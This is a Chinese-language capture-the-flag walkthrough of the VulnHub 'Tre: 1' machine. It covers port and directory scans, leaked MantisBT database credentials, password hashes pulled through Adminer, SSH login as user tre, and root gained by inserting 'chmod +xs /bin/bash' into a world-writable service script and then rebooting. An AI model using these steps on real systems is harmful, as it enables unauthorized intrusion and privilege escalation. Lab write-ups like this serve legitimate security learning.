# Tre: 1

2024-5-25 https://www.vulnhub.com/entry/tre-1,483/

difficulty: Intermediate

## IP

192.168.10.188

## Scan

Open Port -> 22,80,8082

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 991aead7d7b348809f88822a14eb5f0e (RSA)
|   256 f4f69cdbcfd4df6a910a8105defa8df8 (ECDSA)
|_  256 edb9a9d72d00f81bd399d602e5ad179f (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Tre
8082/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Tre
```

8082 对应的 nginx，gobuster 扫描不出其他目录，估计是个摆设。

gobuster 扫描 80 端口，看看有什么信息：

```
http://192.168.10.188/adminer.php          (Status: 200) [Size: 87812]
http://192.168.10.188/info.php             (Status: 200) [Size: 87812]
http://192.168.10.188/cms                  (Status: 301) [Size: 314] [--> http://192.168.10.188/cms/]
http://192.168.10.188/index.html           (Status: 200) [Size: 164]
http://192.168.10.188/mantisbt             (Status: 401) [Size: 461]
http://192.168.10.188/system               (Status: 401) [Size: 461]

```

http://192.168.10.188/mantisbt 可以利用下面的 exp 进入到 www-data 权限的 shell：

```
Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)   | php/webapps/48818.py
```

/adminer.php 是一个 mysql 数据库的图形化管理程序，但是不知道用户和密码，尝试了默认的用户凭据，登陆不了，暂时放这里。

/info.php 是 phpinfo 页面。

http://192.168.10.188/cms 都显示的是静态页面，登陆按钮点击后没反应，估计攻击点也不是这里。

http://192.168.10.188/mantisbt 显示了一个 CMS 系统的登陆页面，看到 CMS 的名字是 mantis，默认凭据是 administrator:root，尝试登陆，但显示被锁定。

继续使用目录扫描工具，看看 /mantisbt 目录下，是否还有其他有用信息。

http://192.168.10.188/mantisbt/config/ 目录中发现了一些配置信息：

```
http://192.168.10.188/mantisbt/config/Web.config

<configuration>
<system.webServer>
<security>
<authorization>
<remove users="*" roles="" verbs=""/>
<add accessType="Deny" users="*"/>
</authorization>
</security>
</system.webServer>
</configuration>
```

显示 Deny All

http://192.168.10.188/mantisbt/config/a.txt 发现了一些数据库的配置信息：

```
$g_hostname      = 'localhost';
$g_db_username   = 'mantissuser';
$g_db_password   = 'password@123AS';
$g_database_name = 'mantis';
$g_db_type       = 'mysqli';
```

还记得前面我们发现的 http://192.168.10.188/adminer.php ，可以用上面获得的凭据进行登陆。在 mantis_user_table 表中，发现了用户名和密码：

```
administrator  3492f8fe2cb409e387ddb0521c999c38
tre            64c4685f8da5c2225de7890c1bad0d7f
```

但是没有找到这个 2 个密码对应的明文。得到了一个 tre 用户，爆破下 ssh 看看能不能行吧，没有找到密码。

这里找了一些资料，看到 tre 的名字是数据库中的 realname 的值，tre 的 realname 为 Tr3@123456A!,再次尝试 ssh 登陆，登陆成功。

http://192.168.10.188/system 要有 http basic 认证，尝试使用 admin:admin 认证成功，页面跳转到 http://192.168.10.188/system/login_page.php 是一个登陆页面，跟http://192.168.10.188/mantisbt 显示的内容是一样的。

进入到 tre 用户后，进行系统枚举。

sudo -l 显示的是 shutdown，直接堵死。

linpeas 枚举，也没发现什么有用信息，在用 pspy 看看系统有没有后天定时任务吧。

发现每秒都在执行 /bin/bash /usr/bin/check-system，并且可写：

```
tre@tre:/tmp$ ls -la /usr/bin/check-system
-rw----rw- 1 root root 135 May 12  2020 /usr/bin/check-system
```

但是这是一个循环：

```
DATE=`date '+%Y-%m-%d %H:%M:%S'`
echo "Service started at ${DATE}" | systemd-cat -p info

while :
do
echo "Checking...";
sleep 1;
done
```

写入后门代码也不会执行，必须写入后将系统重启，才能执行到我们写入的后门代码，这里知道为什么 tre 用户 sudo 权限又重启权限了，原来在这里用上了：

```
sed -i '1i chmod +xs /bin/bash' /usr/bin/check-system
sudo shutdown -r now
```

重启后，得到了 suid 权限的 /bin/bash:

```
-bash-5.0$ /bin/bash -p
bash-5.0# cd /root
bash-5.0# ls
root.txt
bash-5.0# cat root.txt
{SunCSR_Tr3_Viet_Nam_2020}
```

发现脚本是以 service 启动：

```
bash-5.0# cat check-system.service
[Unit]
Description=Systemd service.

[Service]
Type=simple
ExecStart=/bin/bash /usr/bin/check-system

[Install]
WantedBy=multi-user.target
```
